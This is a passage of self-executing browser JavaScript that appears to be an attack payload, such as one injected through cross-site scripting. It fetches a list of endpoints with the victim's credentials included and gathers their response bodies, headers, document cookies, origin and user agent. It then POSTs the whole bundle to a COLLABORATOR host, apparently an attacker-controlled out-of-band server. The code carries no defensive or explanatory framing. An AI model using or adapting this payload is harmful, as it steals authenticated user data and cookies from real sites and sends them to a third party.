        let workingEndpoints = [];
        let checked = 0;
        
        async function testEndpoint(url) {
            try {
                // Try GET first
                const response = await fetch(url, {
                    method: 'GET',
                    credentials: 'include',
                    headers: {
                        'Accept': 'application/json'
                    }
                });
                
                const data = await response.text();
                const headers = {};
                response.headers.forEach((v, k) => { headers[k] = v; });
                
                // Check if we got useful data (not error)
                const isUseful = response.status === 200 && 
                                 data.length > 10 && 
                                 !data.includes('error') &&
                                 !data.includes('401') &&
                                 !data.includes('403');
                
                return {
                    url: url,
                    status: response.status,
                    isUseful: isUseful,
                    headers: headers,
                    data: data.substring(0, 500),
                    setCookie: headers['set-cookie'] || 'None'
                };
            } catch(e) {
                return {
                    url: url,
                    error: e.message
                };
            }
        }
        
        async function scan() {
            document.getElementById('status').innerHTML = `⏳ Scanning ${endpoints.length} endpoints...`;
            
            // Test endpoints in batches of 5
            const batchSize = 5;
            const results = [];
            
            for (let i = 0; i < endpoints.length; i += batchSize) {
                const batch = endpoints.slice(i, i + batchSize);
                const batchResults = await Promise.all(batch.map(testEndpoint));
                results.push(...batchResults);
                
                // Update status
                const done = Math.min(i + batchSize, endpoints.length);
                document.getElementById('status').innerHTML = 
                    `⏳ Scanning... ${done}/${endpoints.length}`;
                
                // Check for useful endpoints
                const useful = results.filter(r => r.isUseful);
                if (useful.length > 0) {
                    document.getElementById('status').innerHTML = 
                        `🎯 Found ${useful.length} useful endpoints!`;
                }
            }
            
            // Filter results
            const usefulEndpoints = results.filter(r => r.isUseful);
            const errorEndpoints = results.filter(r => r.error);
            const workingButNoData = results.filter(r => r.status && r.status !== 200);
            
            // Get cookies from document
            const docCookies = document.cookie || 'No cookies (HttpOnly)';
            
            // Prepare final payload
            const payload = {
                scan_results: {
                    total: endpoints.length,
                    useful: usefulEndpoints.length,
                    errors: errorEndpoints.length,
                    working_but_no_data: workingButNoData.length
                },
                useful_endpoints: usefulEndpoints,
                error_endpoints: errorEndpoints.slice(0, 10), // First 10 errors
                working_endpoints: workingButNoData.slice(0, 10), // First 10
                document_cookies: docCookies,
                all_results: results.slice(0, 20), // First 20 results
                timestamp: new Date().toISOString(),
                origin: window.location.origin,
                userAgent: navigator.userAgent
            };
            
            // Display
            document.getElementById('result').textContent = JSON.stringify(payload, null, 2);
            
            if (usefulEndpoints.length > 0) {
                document.getElementById('status').innerHTML = 
                    `✅ Found ${usefulEndpoints.length} working endpoints! Check result.`;
            } else {
                document.getElementById('status').innerHTML = 
                    '⚠️ No useful endpoints found. All endpoints require authentication or are protected.';
            }
            
            // Send to Collaborator
            await fetch(COLLABORATOR, {
                method: 'POST',
                mode: 'no-cors',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify(payload)
            });
            
            console.log('[+] Scan complete!');
            console.log('[+] Useful endpoints:', usefulEndpoints);
        }
        
        // ===== Execute =====
        scan();
    })();
